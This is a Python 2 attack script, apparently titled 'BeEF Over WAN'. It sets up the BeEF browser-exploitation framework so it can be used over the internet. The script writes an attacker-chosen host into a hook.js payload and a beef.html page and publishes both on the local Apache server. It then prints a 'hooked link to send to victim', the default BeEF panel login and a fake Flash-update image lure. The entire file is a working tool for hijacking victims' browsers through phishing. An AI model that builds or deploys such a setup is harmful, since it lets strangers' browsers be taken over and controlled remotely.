#!/usr/bin/python
# -*- coding: utf8 -*-

import random 
import string
import argparse
import os
from termcolor import colored
Filename="hook.js"

def banner():
	return """
  ____            ______    ____                  __          __     _   _ 
 |  _ \          |  ____|  / __ \                 \ \        / /\   | \ | |
 | |_) | ___  ___| |__    | |  | |_   _____ _ __   \ \  /\  / /  \  |  \| |
 |  _ < / _ \/ _ \  __|   | |  | \ \ / / _ \ '__|   \ \/  \/ / /\ \ | . ` |
 | |_) |  __/  __/ |      | |__| |\ V /  __/ |       \  /\  / ____ \| |\  |
 |____/ \___|\___|_|       \____/  \_/ \___|_|        \/  \/_/    \_\_| \_|
                                                                           
 BY SKS... Edit by Dev913.info  
 https://github.com/stormshadow07                                                                                                                          """
def color(string, color=None):
    attr = []
    attr.append('1')
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

    else:
        if string.strip().startswith("[!]"):
            attr.append('31')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[+]"):
            attr.append('32')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[?]"):
            attr.append('33')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[*]"):
            attr.append('34')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        else:
            return string
def string_replace(filename, old_string, new_string):
    # Safely read the input filename using 'with'
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            print '"{old_string}" not found in {filename}.'.format(**locals())
            return

    # Safely write the changed content, if found in the file
    with open(filename, 'w') as f:
        #print 'Changing "{old_string}" to "{new_string}" in {filename}'.format(**locals())
        s = s.replace(old_string, new_string)
        f.write(s)
	print color(' [✔] File Changed...','green')





if __name__ == '__main__':
	os.system("clear")	
	print color(" Checking Services Status Required ","blue")
	os.system("sudo service apache2 start")
	os.system("sudo start beef")
	os.system("clear")
	print color(banner(),"green")
	send_to=raw_input(color((' [?] Enter Adress of Link [You are Sending to Victim]: ')))
	send_to=send_to.rstrip()
	print color((" [+] Send_To Link  : "+ send_to))
	connect_to=raw_input(color((' [?] Enter Adress of Link [Your Link will be Connecting to..]: ')))
	connect_to=connect_to.rstrip()
	print color((" [+] Connect_To Link  : "+ connect_to))
	print color(' [✔] Checking directories...','green')
	if not os.path.isdir("./temp"):
		os.makedirs("sudo ./temp")
		print (color(" [+] Creating [./temp] directory for resulting code files","green"))
	else:
		os.system("rm -rf temp/*")
		print color(" [✔] Clean Succesful","green")
	connect_to_full=connect_to+":80/hook.js"
	connect_to_panel=connect_to+"/ui/panel"
	send_to_full=send_to+'/beef.html'
	#print connect_to_full
	os.system("cp base.js ./temp/hook.js")
	string_replace("./temp/hook.js","SKS_1",connect_to_full)
	string_replace("./temp/hook.js","SKS_2",connect_to)
	
	os.system("sudo cp beef.html ./temp/beef.html")
	string_replace("./temp/beef.html","SKS_3",send_to)
	os.system("sudo cp ./temp/* /var/www/html/")
	os.system("sudo chmod a+rw /var/www/html/hook.js")
	
	print color(" \n==================================== RESULT ====================================\n","blue")
	print color(" [+] Access The BeeF Control Panel Using : {}".format(connect_to_panel),"green")
	print color(" Username = beef\n Password = beef\n","blue")
	print color(" [+] Hooked Link To Send to Victim  : "+send_to_full,"green")
	print color(" FROM Image URL : http://0.0.0.0:3000/adobe/flash_update.png\n","red")
	print color(" TO Image URL : {}:80/adobe/flash_update.png \n".format(connect_to),"green")
        print color ('\n Having a problem?... Tip? Just contact me @: https://github.com/stormshadow07',"green")

		
















